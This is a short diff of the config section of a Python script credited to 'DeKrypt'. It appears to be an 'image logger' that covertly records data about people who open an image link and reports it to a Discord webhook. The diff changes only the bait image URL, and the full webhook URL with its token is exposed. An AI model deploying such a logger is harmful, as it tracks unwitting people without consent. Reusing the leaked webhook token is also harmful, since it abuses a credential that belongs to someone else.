@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1074706156045484143/cvXSMW-9-89AgOwDZN8z6eejV7OaOwx9OZiexKAZG7Az_1RDi8aNr_XLqMz3JxAKxs-d",
-    "image": "https://www.bing.com/images/search?view=detailV2&ccid=4XB8NF1a&id=52817A47CE475B4BBE67BF8DBBA081928313EBA4&thid=OIP.4XB8NF1awQyApnQDDmBmQwHaEo&mediaurl=https%3a%2f%2fth.bing.com%2fth%2fid%2fR.e1707c345d5ac10c80a674030e606643%3frik%3dpOsTg5KBoLuNvw%26riu%3dhttp%253a%252f%252fwww.snut.fr%252fwp-content%252fuploads%252f2015%252f08%252fimage-de-paysage.jpg%26ehk%3d1O5SWKkGpZ8yU%252b%252fAnLXG1v8k6BKxgyiXgHbOWBW1ir0%253d%26risl%3d1%26pid%3dImgRaw%26r%3d0&exph=1600&expw=2560&q=image&simid=608013914851144895&FORM=IRPRST&ck=FF967D6F2AF48F64F7228E9020EB8570&selectedIndex=0", # You can also have a custom image by using a URL argument
+    "image": "https://th.bing.com/th/id/R.b800dbf759c6db248a743893e184c381?rik=Iv5qpJu3Vcao3g&pid=ImgRaw&r=0", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
 
     # CUSTOMIZATION #
